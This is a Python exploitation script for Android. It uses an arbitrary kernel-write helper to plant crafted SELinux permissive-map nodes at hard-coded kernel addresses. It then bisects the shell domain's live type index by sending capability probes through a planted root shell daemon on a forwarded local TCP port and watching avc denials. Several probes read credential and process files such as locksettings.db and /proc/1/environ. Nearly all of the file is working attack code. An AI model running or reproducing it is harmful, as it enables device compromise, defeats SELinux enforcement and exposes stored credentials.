#!/usr/bin/env python3
"""Bisect the LIVE type index of the shell domain using capability checks as one-shot probes.

Why capabilities: an avc key is (ssid, tsid, tclass, perms), and editing the map in RAM does not
flush the cache -- so every step needs a key never asked before this boot.  For a capability check
the tsid is the task's own context, and each capability is a different `perms` value, so the kernel
gives one fresh key per capability.  Both answers are informative from a single use:
  permissive=1  -> shell IS exempted, so shell is inside the range just planted
  permissive=0  -> not exempted, and it also proves the policy denies this capability to shell
  no line       -> the policy allows this capability, so the step says nothing; next key
"""
import struct, subprocess, sys, time
HEAD = 0xffffffc001d61248
NODE = 0xffffffc001a41c00
ADB = "adb shell".split()
# (name, command run as the daemon's root shell, must be harmless)
PROBES = [
    ("net_raw",    "ping -c 1 127.0.0.1 2>&1 | head -n 1"),
    ("kill",       "kill -0 1 2>&1 | head -n 1"),
    ("sys_chroot", "chroot / /system/bin/true 2>&1 | head -n 1"),
    ("sys_nice",   "renice -20 1 2>&1 | head -n 1"),
    ("sys_ptrace", "cat /proc/1/environ 2>&1 | head -n 1"),
    ("sys_module", "insmod /dev/null 2>&1 | head -n 1"),
    ("fsetid",     "chown 2000:3003 /data/local/tmp/pf.conf 2>&1 | head -n 1"),
    ("fowner",     "chmod 770 /data/local/tmp/pf.conf 2>&1 | head -n 1"),
    ("sys_time",   "date -s 010100002030.11 2>&1 | head -n 1"),
    ("sys_admin",  "swapon /dev/null 2>&1 | head -n 1"),
    ("net_admin",  "ip link set lo down 2>&1 | head -n 1"),
    ("sys_resource","ulimit -c unlimited 2>&1 | head -n 1"),
    ("dac_read_search", "cat /data/system/locksettings.db 2>&1 | head -n 1"),
    ("setfcap",    "getcap /system/bin/ping 2>&1 | head -n 1"),
    # second phase: capabilities whose check was not reached in phase 1 (no avc line = key still
    # unused), each written so the DAC path actually fails first and the kernel really asks for the
    # capability.  Perms already answered in phase 1 (sys_chroot, sys_module, fowner, sys_admin,
    # dac_read_search) are deliberately not reused: their nodes are cached.
    ("net_bind_service", "nc -L -p 21 -w 1 2>&1 | head -n 1"),
    ("kill",     "kill -0 $(pidof mdnsd) 2>&1 | head -n 1"),
    ("dac_override", "chmod 000 /data/local/tmp/pd.conf; cat /data/local/tmp/pd.conf 2>&1 | head -n 1"),
    ("fsetid",   "chown root:log /data/local/tmp/pf.conf 2>&1 | head -n 1"),
    ("net_raw",  "ping -c 1 -4 127.0.0.1 2>&1 | head -n 1"),
    ("sys_nice", "renice -20 $(pidof system_server) 2>&1 | head -n 1"),
    ("sys_ptrace", "cat /proc/$(pidof zygote64)/environ 2>&1 | head -n 1"),
    ("sys_time", "date -s 2018-07-02\ 06:00:00 2>&1 | head -n 1"),
    # phase 3: the phase-2 commands that produced no line did not reach a capability check at all
    # (wrong tool, wrong gid already in our supplementary set, DAC allowed it, or the argument did
    # not parse).  These are written so the DAC path fails first and the kernel must ask SELinux.
    ("dac_override", "chmod 400 /data/local/tmp/pd.conf; echo x >> /data/local/tmp/pd.conf 2>&1 | head -n 1"),
    ("kill",     "kill -0 $(pidof system_server) 2>&1 | head -n 1"),
    ("fsetid",   "chgrp 3006 /data/local/tmp/pf.conf 2>&1 | head -n 1"),
    ("sys_time", "date -s 010101012030.30 2>&1 | head -n 1"),
    ("sys_nice", "nice -n -20 id 2>&1 | head -n 1"),
    ("net_bind_service", "nc -L -p 21 2>&1 | head -n 1"),
    ("sys_chroot", "chroot /data /system/bin/true 2>&1 | head -n 1"),
]
def sh(cmd, t=120):
    return subprocess.run(ADB + [cmd], capture_output=True, text=True, timeout=t).stdout
def seen(kind):
    return int(sh(f"dmesg | grep -ac 'denied {{ {kind} }}'").strip() or 0)
def plant(bits):
    bits = sorted(set(int(b) for b in bits))
    hi = max(bits)
    nwin = hi // 384 + 1
    if nwin > 4:
        raise SystemExit("too wide")
    for i in range(nwin):
        nb = bytearray(64)
        struct.pack_into("<Q", nb, 0, NODE + 64 * (i + 1) if i + 1 < nwin else 0)
        for b in bits:
            if i * 384 <= b < (i + 1) * 384:
                off = b - i * 384
                nb[8 + off // 8] |= 1 << (off % 8)
        struct.pack_into("<I", nb, 0x38, i * 384)
        if sh(f"cd /data/local/tmp && ./broot7 w {NODE+64*i:x} 64 {bytes(nb).hex()} 16 3>rp.txt >wl.txt 2>&1; cat rp.txt | tr -d '\\r'").strip() != "ok":
            raise SystemExit(f"node {i} failed")
    if sh(f"cd /data/local/tmp && ./broot7 w {HEAD:x} 16 {struct.pack('<QII', NODE, hi, 0).hex()} 16 3>rp.txt >wl.txt 2>&1; cat rp.txt | tr -d '\\r'").strip() != "ok":
        raise SystemExit("head failed")
def rootsh(cmd, wait=2.5):
    """Run one command through the daemon's raw root shell.

    It HAS to be the root task: a capability check is only consulted when the task actually holds
    the capability, so the same probe from uid 2000 returns EPERM with no avc line at all -- that is
    what made the first run of this script read "policy allows it" for all 14 probes.
    """
    subprocess.run(["adb", "forward", "tcp:12345", "tcp:12345"], capture_output=True, timeout=30)
    q = "'" + cmd.replace("'", "'\\''") + "'"
    inner = ("exec 3<>/dev/tcp/127.0.0.1/12345; printf '%s\\n' " + q +
             " >&3; sleep " + str(wait) + "; timeout 3 cat <&3 | tr -dc '[:print:]\\n'")
    r = subprocess.run(["bash", "-c", inner], capture_output=True, timeout=90)
    return (r.stdout or b"").decode("latin1").replace("\r", "")

def step(lo, mid, pi):
    plant(range(lo, mid + 1))
    name, cmd = PROBES[pi]
    n0 = seen(name)
    rootsh("touch /data/local/tmp/pf.conf; " + cmd)
    time.sleep(1.2)
    n1 = seen(name)
    if n1 == n0:
        return None, f"{name}: no new avc line (policy allows it)"
    flag = sh(f"dmesg | grep -a 'denied {{ {name} }}' | tail -n 1 | grep -ao 'permissive=[01]'")
    flag = flag.strip()
    if "permissive=1" in flag:
        return True, f"{name}: EXEMPT"
    if "permissive=0" in flag:
        return False, f"{name}: not exempt"
    return None, f"{name}: unreadable flag {flag!r}"
lo = int(sys.argv[1]) if len(sys.argv) > 1 else 0
hi = int(sys.argv[2]) if len(sys.argv) > 2 else 1212
pi = int(sys.argv[3]) if len(sys.argv) > 3 else 0
print(f"# interval {lo}..{hi}, probes available {len(PROBES)}", flush=True)
while hi - lo > 0 and pi < len(PROBES):
    mid = (lo + hi) // 2
    v, why = step(lo, mid, pi)
    pi += 1
    if v is None:
        print(f"  [{lo}..{mid}] inconclusive ({why}); next key", flush=True)
        continue
    print(f"  [{lo}..{mid}] -> {why}", flush=True)
    if v:
        hi = mid
    else:
        lo = mid + 1
print(f"# live shell index candidate = {lo}", flush=True)
